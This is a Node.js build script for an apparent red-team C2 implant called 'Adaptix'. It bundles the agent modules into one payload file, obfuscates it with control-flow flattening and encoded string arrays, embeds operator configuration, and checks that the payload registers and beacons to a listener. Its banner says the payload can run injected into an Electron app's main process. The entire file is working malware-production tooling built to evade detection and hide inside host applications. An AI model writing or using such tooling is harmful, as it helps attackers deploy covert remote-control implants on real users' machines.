#!/usr/bin/env node
// build_payload.js — bundle src/ into ONE self-contained payload file,
// obfuscate it (javascript-obfuscator, dev-time only), and verify each
// artifact against the mock listener (registration + tick proof).
//
// Why hand-rolled? The runtime has ZERO npm dependencies, so a ~100-line
// CommonJS concatenator is fully deterministic and audit-friendly — no
// bundler magic in a red-team payload. Module bodies are emitted VERBATIM
// inside wrapper functions; only `require('./x')` is re-bound to the
// internal registry (bare specifiers like 'crypto' pass through to node).
//
// Usage:
//   node scripts/build_payload.js            # build plain + obfuscated
//   node scripts/build_payload.js --no-obf   # plain only
//   node scripts/build_payload.js --verify   # build + mock-listener pairs
//   node scripts/build_payload.js --verify-only
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const ROOT = path.join(__dirname, '..');
const SRC = path.join(ROOT, 'src');
const DIST = path.join(ROOT, 'dist');
const ENTRY = 'entry';

// ---------------------------------------------------------------- bundler --
function scan() {
  const mods = {};
  for (const f of fs.readdirSync(SRC)) {
    if (!f.endsWith('.js')) continue;
    const name = path.basename(f, '.js');
    mods[name] = fs.readFileSync(path.join(SRC, f), 'utf8');
  }
  return mods;
}

function depsOf(code) {
  const out = new Set();
  const re = /require\(\s*(['"])\.\/([\w-]+)\1\s*\)/g;
  let m;
  while ((m = re.exec(code))) out.add(m[2]);
  return [...out];
}

function topoSort(mods, root) {
  const order = [];
  const seen = new Set();
  const stack = [[root, false]];
  while (stack.length) {
    const [name, done] = stack.pop();
    if (done) { order.push(name); continue; }
    if (seen.has(name)) continue;
    seen.add(name);
    stack.push([name, true]);
    for (const d of depsOf(mods[name])) {
      if (!mods[d]) throw new Error(`module "${name}" requires missing "./${d}"`);
      if (!seen.has(d)) stack.push([d, false]);
    }
  }
  return order;
}

function emit(mods, order) {
  const banner =
`// YADDA single-file payload
// generated ${new Date().toISOString()} from src/{${order.join(', ')}}
// run modes: plain node | injected into Electron main | app main.js
// DO NOT EDIT — edit src/ and rebuild (node scripts/build_payload.js)
`;
  const head =
`(function (realRequire, bundleDirname) {
  'use strict';
  const __modules = Object.create(null);
  function __define(name, factory) { __modules[name] = { factory: factory, inst: undefined }; }
  function __require(name) {
    const m = __modules[name];
    if (!m) throw new Error('adaptix payload: missing module "' + name + '"');
    if (m.inst === undefined) {
      const module = { exports: {} };
      m.inst = null; // cycle guard
      const localRequire = function (spec) {
        if (spec.charAt(0) === '.') return __require(spec.replace(/^\\.\\\\?\\//, ''));
        return realRequire(spec); // node builtins / host app modules
      };
      m.inst = m.factory(localRequire, module, module.exports, bundleDirname) || module.exports;
    }
    return m.inst;
  }
`;
  const parts = [banner, head];
  for (const name of order) {
    const body = mods[name].replace(/\r\n/g, '\n');
    parts.push(`  __define(${JSON.stringify(name)}, function (require, module, exports, __dirname) {\n`);
    parts.push(body);
    parts.push(`\n  });\n`);
  }
  parts.push(`  __require(${JSON.stringify(ENTRY)});\n})(require, __dirname);\n`);
  return parts.join('');
}

// ----------------------------------------------------------- verification --
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function verifyArtifact(artifact) {
  const port = 20000 + (process.pid % 20000);
  const env = { ...process.env, LISTEN_PORT: String(port) };
  const listener = spawn(process.execPath, [path.join(ROOT, 'test', 'mock_listener.js')], { env, stdio: ['ignore', 'pipe', 'pipe'] });
  let lout = '';
  listener.stdout.on('data', (d) => { lout += d; });

  try {
    await sleep(700);
    const aenv = { ...process.env, ADAPTIX_HOST: '127.0.0.1', ADAPTIX_PORT: String(port), ADAPTIX_SSL: '0', MAX_CYCLES: '3', ADAPTIX_DEBUG: '1' };
    const agent = spawn(process.execPath, [artifact], { env: aenv, stdio: ['ignore', 'pipe', 'pipe'] });
    let aout = '';
    agent.stdout.on('data', (d) => { aout += d; });
    agent.stderr.on('data', (d) => { aout += d; });

    const deadline = Date.now() + 25000;
    while (Date.now() < deadline) {
      if (lout.includes('NEW agent registered') && (aout.match(/\[\+\] tick/g) || []).length >= 2) break;
      if (agent.exitCode !== null) break;
      await sleep(300);
    }
    try { agent.kill('SIGKILL'); } catch (_) {}
    const registered = lout.includes('NEW agent registered');
    const ticked = (aout.match(/\[\+\] tick/g) || []).length >= 2;
    return { registered, ticked, aout, loutTail: lout.split('\n').slice(-14).join('\n') };
  } finally {
    try { listener.kill('SIGKILL'); } catch (_) {}
  }
}

// ------------------------------------------------------------------- main --
(async () => {
  const args = process.argv.slice(2);
  const doVerify = args.includes('--verify') || args.includes('--verify-only');
  const noObf = args.includes('--no-obf');

  // --bake <config.json>: embed an operator config into the payload itself
  // (self-contained, PE-style). Priority at runtime: env > sidecar > baked > defaults.
  let baked = null;
  const bakeIdx = args.indexOf('--bake');
  if (bakeIdx >= 0) {
    const f = args[bakeIdx + 1];
    if (!f) throw new Error('--bake requires a path to a config JSON');
    baked = JSON.parse(fs.readFileSync(f, 'utf8'));
    console.log('[build] baking config from ' + f + ' (keys: ' + Object.keys(baked).join(', ') + ')');
  }
  const bakePre = baked ? 'globalThis.__ADAPTIX_BAKED__ = ' + JSON.stringify(baked) + ';\n' : '';
  if (!args.includes('--verify-only') || true) {
    fs.mkdirSync(DIST, { recursive: true });
    const mods = scan();
    const order = topoSort(mods, ENTRY);
    console.log('[build] module order:', order.join(' -> '));

    const plain = emit(mods, order);
    fs.writeFileSync(path.join(DIST, 'adaptix.payload.js'), bakePre + plain);
    console.log(`[build] plain   -> dist/adaptix.payload.js  (${bakePre.length + plain.length} bytes)`);
  }

  let obfPath = null;
  if (!noObf && !args.includes('--verify-only')) {
    const JavaScriptObfuscator = require('javascript-obfuscator');
    const src = fs.readFileSync(path.join(DIST, 'adaptix.payload.js'), 'utf8');
    const out = JavaScriptObfuscator.obfuscate(src, {
      compact: true,
      simplify: true,
      controlFlowFlattening: true,
      controlFlowFlatteningThreshold: 0.5,
      stringArray: true,
      stringArrayThreshold: 0.8,
      stringArrayEncoding: ['base64'],
      stringArrayRotate: true,
      stringArrayShuffle: true,
      stringArrayWrappersCount: 2,
      stringArrayWrappersChainedCalls: true,
      stringArrayIndexShift: true,
      transformObjectKeys: true,
      numbersToExpressions: true,
      splitStrings: true,
      splitStringsChunkLength: 10,
      identifierNamesGenerator: 'hexadecimal',
      unicodeEscapeSequence: false,
      // safety with a host app: no global renames, no self-defending traps,
      // no debug protection, console kept (quiet mode handles silence)
      renameGlobals: false,
      selfDefending: false,
      debugProtection: false,
      disableConsoleOutput: false,
    }).getObfuscatedCode();
    obfPath = path.join(DIST, 'adaptix.payload.obf.js');
    fs.writeFileSync(obfPath, out);
    console.log(`[build] obf     -> dist/adaptix.payload.obf.js  (${out.length} bytes)`);
  }

  if (doVerify) {
    const targets = [path.join(DIST, 'adaptix.payload.js')];
    if (!noObf && obfPath && fs.existsSync(obfPath)) targets.push(obfPath);
    let fail = false;
    for (const t of targets) {
      process.stdout.write(`[verify] ${path.basename(t)} ... `);
      const r = await verifyArtifact(t);
      if (r.registered && r.ticked) {
        console.log('OK (registered + ticked)');
      } else {
        fail = true;
        console.log(`FAIL (registered=${r.registered} ticked=${r.ticked})`);
        console.log('--- payload output ---\n' + r.aout.slice(-1200));
        console.log('--- listener tail ---\n' + r.loutTail);
      }
    }
    process.exit(fail ? 1 : 0);
  }
})().catch((e) => { console.error('[build] fatal:', e); process.exit(1); });
